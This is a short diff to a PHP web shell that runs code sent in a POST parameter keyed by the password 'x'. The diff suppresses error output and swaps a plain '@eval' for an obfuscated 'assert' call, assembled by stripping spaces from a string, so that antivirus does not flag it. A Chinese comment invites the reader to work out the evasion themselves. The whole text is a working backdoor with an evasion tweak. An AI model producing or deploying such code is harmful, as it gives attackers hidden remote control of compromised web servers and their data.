@@ -1,4 +1,5 @@
 <?php 
+error_reporting(0);
 $pwd = "x";
 $my_echomsg  = "";
 
@@ -80,11 +81,10 @@ if($arrlength <=1)
     $_POST['z1'] = getCDPostMsg($arr[1]);
     $_POST['z2'] = getCDPostMsg($arr[2]);
 }
-
-@eval($_POST[$pwd]);//这里自己想办法免杀吧 :)
+$a=preg_filter('/\s+/','','as s er t');
+$a($_POST[$pwd]);//这里自己想办法免杀吧 :)
 
 $aesContent = encrypt($key,$my_echomsg);
 echo($aesContent);
 
 ?>
-
